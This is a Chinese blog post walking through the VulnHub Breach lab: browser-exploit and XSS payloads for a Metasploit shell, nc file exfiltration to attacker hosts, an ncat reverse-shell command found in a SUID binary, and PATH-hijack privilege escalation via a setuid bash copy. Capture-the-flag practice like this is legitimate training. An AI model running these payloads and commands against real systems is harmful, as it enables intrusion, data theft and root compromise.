+<p>使用msf里面的 <strong>exploit&#x2F;multi&#x2F;browser&#x2F;firefox_tostring_console_injection</strong> 这个模块 </p>
+<p>跟breach:2.0 里面用到的那个xss很像  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453313.png" srcset="/img/loading.gif" lazyload alt="1732635871101"></p>
+<p>配置好参数 直接run  </p>
+<p>发现收不到session…  </p>
+<p>可能是xss的payload有问题 试试beef-xss  </p>
+<p>反正各种试xss的payload  </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://192.168.206.132:7777/ppp&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://&lt;ip&gt;:3001/hook.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://192.168.206.132:7777/yxy&quot;</span>&gt;</span> alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>终于收到了shell</strong>  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453546.png" srcset="/img/loading.gif" lazyload alt="1732682816121"></p>
+<p>一般来说 这种由浏览器漏洞得到的shell很不稳定 使用另一个模块<strong>post&#x2F;multi&#x2F;manage&#x2F;shell_to_meterpreter</strong> 去稳定  </p>
+<p>中间又给我断了一次 好不容易又连上了  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453764.png" srcset="/img/loading.gif" lazyload alt="1732684780771"></p>
+<p>  进入meterpreter类型的会话 使用shell进去 进去之后发现这台机器也就是内置的第二个虚拟机 那么flag3应该也在这里面  </p>
+<p>环境里面有python 升级tty  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453596.png" srcset="/img/loading.gif" lazyload alt="1732685053185"></p>
+<p>发现&#x2F;home目录下面有这个blumbergh人的目录  </p>
+<p>利用上面信息搜集到的密码直接切换用户试试  </p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">blumbergh:</span>C0ff33stainS<br></code></pre></td></tr></table></figure>
+
+<p>切换成功  </p>
+<p>尝试查找flag3  </p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / flag*<br></code></pre></td></tr></table></figure>
+
+<p>没找到 先尝试提权吧  </p>
+<p>尝试查找具有suid位的文件  </p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453851.png" srcset="/img/loading.gif" lazyload alt="1732691371306"></p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">/home/blumbergh/swingline<br></code></pre></td></tr></table></figure>
+
+<p>发现这个文件具有suid权限 其他的似乎都不能利用  </p>
+<p>去查看一下  </p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">file</span> <span class="hljs-regexp">/home/</span>blumbergh/swingline<br><span class="hljs-regexp">/home/</span>blumbergh<span class="hljs-regexp">/swingline: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /</span>lib64<span class="hljs-regexp">/ld-linux-x86-64.so.2, for GNU/</span>Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">32</span>, BuildID[sha1]=<span class="hljs-number">7</span>edc6990791be6d637013f297b37b7cb496dccb0, not stripped<br></code></pre></td></tr></table></figure>
+
+<p>是一个elf可执行程序 尝试拿出来拿到本地进行分析  </p>
+<p>因为当前环境有nc这个命令 直接在kali本地监听一个端口  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvnp <span class="hljs-number">4848</span> &gt; <span class="hljs-number">1</span>.elf<br></code></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">192.168.206.132</span> <span class="hljs-number">4848</span> &lt; /home/blumbergh/swingline<br></code></pre></td></tr></table></figure>
+
+<p>这样就能将文件传到本地  nc 113.44.69.108 5045 &lt; &#x2F;usr&#x2F;bin&#x2F;pkexec</p>
+<p>然后放到 <code>https://dogbolt.org/</code> 这个平台上面在线分析  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091454044.png" srcset="/img/loading.gif" lazyload alt="1732694061238"></p>
+<p>把逆向的结果拿到本地  </p>
+<p>详细分析  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091454435.png" srcset="/img/loading.gif" lazyload alt="1732694355641"></p>
+<p>逆向出来的结果里面在mian函数里面的最后执行了system函数 pcVar1是一个变量  </p>
+<p>尝试动态分析 在system那里打断点 运行  </p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Breakpoint <span class="hljs-number">1</span>,__libc_system (<span class="hljs-built_in">line</span>=<span class="hljs-number">0x7fffffffe150</span> <span class="hljs-string">&quot;ncat -6 -e /bin/bash 0:0:0:0:0:0:0:1 8889 &gt;/dev/null 2&gt;81 &amp;echo&quot;</span>) <span class="hljs-keyword">at</span> ../sysdeps/posix/<span class="hljs-keyword">system</span>.c:<span class="hljs-number">202</span> <br><span class="hljs-number">202.</span>./sysdeps/posix/<span class="hljs-keyword">system</span>.c:No such <span class="hljs-built_in">file</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">directory</span>.<br></code></pre></td></tr></table></figure>
+
+<p>结果是这样 会执行这样的一条命令  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ncat</span> -<span class="hljs-number">6</span> -e /bin/bash <span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">1</span> <span class="hljs-number">8889</span> &gt;/dev/null <span class="hljs-number">2</span>&gt;<span class="hljs-number">81</span> &amp;echo<br></code></pre></td></tr></table></figure>
+
+<p>可以尝试进行环境变量提权  </p>
+<p>首先环境变量劫持提权的条件，就是系统中存在带有suid的文件(<strong>swingline</strong>)，且这个 文件中必须有系统命令(<strong>ncat</strong>；<br>这样我们就可以命名一个和这个系统命令相同的文件，写入&#x2F;bin&#x2F;bash, 再将存放这个文件的路径加入环境变量中；<br>当系统去执行这个带有系统命令的文件时，就会直接执行我们命名和这个系统命令相同的文件，而非真实的系统命令；<br>从而实现劫持环境变量提权。</p>
+<p>完美符合以上条件  </p>
+<p>直接输入以下内容  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/bash&#x27;</span> &gt; ncat  <br><span class="hljs-built_in">chmod</span> +x ncat  <br><span class="hljs-built_in">export</span> PATH=/home/blumbergh:<span class="hljs-variable">$PATH</span>  <br></code></pre></td></tr></table></figure>
+
+<p>检查一下  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091454836.png" srcset="/img/loading.gif" lazyload alt="1732699036147"></p>
+<p>没问题  </p>
+<p>然后又有一个坑 因为这是由meterpreter得到的shell 得重新”退”一下 然后才能完全加载这个重新设置的环境变量  </p>
+<p>也就是 像这样操作一遍    </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091454094.png" srcset="/img/loading.gif" lazyload alt="1732696823889"></p>
+<p>操作完成之后 再去直执行那个有suid位的文件  会看到这样  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091454090.png" srcset="/img/loading.gif" lazyload alt="1732696892030"></p>
+<p>这也就代表提到了root权限  </p>
+<p>使用find命令查找flag3的位置  </p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -type f -name <span class="hljs-string">&#x27;*flag3*&#x27;</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p>??? 找不到 而且 root目录也进不去…看上去是提权失败了 不知道为什么..</p>
+<p>还是用 视频里面的方法吧…  </p>
+<p>输入下面这些内容到ncat里面  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">cp</span> /bin/bash /tmp/shell<br><span class="hljs-built_in">chmod</span> +s /tmp/shell<br></code></pre></td></tr></table></figure>
+
+<p>然后配置好环境变量 <code>echo $PATH=$HOME:$PATH</code>  </p>
+<p>直接运行 .&#x2F;swingline </p>
+<p>然后查看&#x2F;tmp 发现出现shell 直接运行 成功得到root权限  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091454348.png" srcset="/img/loading.gif" lazyload alt="1732699511835"></p>
+<p>然后再找 找到在这里  </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/root/</span>Desktop<span class="hljs-regexp">/ /</span> /flag3.txt<br></code></pre></td></tr></table></figure>
+
+<p>中间的目录是两个空格 使用反斜杠来转义  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091454456.png" srcset="/img/loading.gif" lazyload alt="1732699724328"></p>
+<p>最终得到flag3  </p>
+<p>至此 本系列完结撒花!!!  </p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Congratulations <span class="hljs-keyword">on</span> reaching the <span class="hljs-keyword">end</span>! But <span class="hljs-keyword">is</span> this the <span class="hljs-keyword">end</span>? <span class="hljs-keyword">Or</span> will there be more? <span class="hljs-type">Time</span> will tell. <span class="hljs-keyword">For</span> now I am going <span class="hljs-keyword">to</span> sit <span class="hljs-keyword">on</span> the beach <span class="hljs-keyword">and</span> sip an umbrella drink <span class="hljs-keyword">with</span> Milton.<br><br><span class="hljs-keyword">If</span> you completed the whole series, I hope you enjoyed it <span class="hljs-keyword">and</span> learned <span class="hljs-keyword">some</span> <span class="hljs-built_in">new</span> things. My goal was <span class="hljs-keyword">to</span> <span class="hljs-keyword">create</span> <span class="hljs-keyword">some</span> <span class="hljs-keyword">unique</span>, progressively more difficult, challenges <span class="hljs-keyword">to</span> showcase <span class="hljs-keyword">some</span> <span class="hljs-type">real</span>-world vulnerabilities <span class="hljs-keyword">in</span> a fun/slightly frustrating manner.<br><br>Huge thanks goes <span class="hljs-keyword">to</span> knightmare <span class="hljs-keyword">for</span> his assistance along the way <span class="hljs-keyword">with</span> <span class="hljs-keyword">all</span> <span class="hljs-number">3</span> <span class="hljs-keyword">of</span> these VMs, especially the advice <span class="hljs-keyword">on</span> emulation <span class="hljs-keyword">and</span> disc space optimization <span class="hljs-keyword">as</span> well <span class="hljs-keyword">as</span> countless rounds <span class="hljs-keyword">of</span> testing. <br><br><span class="hljs-keyword">Also</span> shout-<span class="hljs-keyword">out</span> <span class="hljs-keyword">to</span> g0blin, Rand0mByteZ, mr_h4sh <span class="hljs-keyword">and</span> vdbaan <span class="hljs-keyword">for</span> testing this VM.<br><br><span class="hljs-keyword">As</span> <span class="hljs-keyword">always</span>, thank you <span class="hljs-keyword">to</span> g0tmi1k <span class="hljs-keyword">and</span> the entire vulnhub crew <span class="hljs-keyword">for</span> hosting these challenges <span class="hljs-keyword">and</span> maintaining this amazing community.<br><br><span class="hljs-keyword">Some</span> words <span class="hljs-keyword">of</span> advice: <span class="hljs-keyword">no</span> one started <span class="hljs-keyword">as</span> an expert, at <span class="hljs-keyword">some</span> <span class="hljs-type">point</span> you were stuck <span class="hljs-keyword">and</span> someone helped you <span class="hljs-keyword">out</span>. Don<span class="hljs-string">&#x27;t be a dick. Pay it forward. </span><br><span class="hljs-string"></span><br><span class="hljs-string">If you are new or trying to break in, learn how to ask questions. Show that you&#x27;</span>ve done your research first <span class="hljs-keyword">and</span> most people will be more than willing <span class="hljs-keyword">to</span> help.<br><br><span class="hljs-keyword">Until</span> next <span class="hljs-type">time</span>.<br><br>-mrb3n<br></code></pre></td></tr></table></figure>
+
+<p><strong>文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎各位师傅指点和纠正，感激不尽。</strong>  </p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>http://example.com/2025/06/09/vulhub靶机breach系列/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/29/sql/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
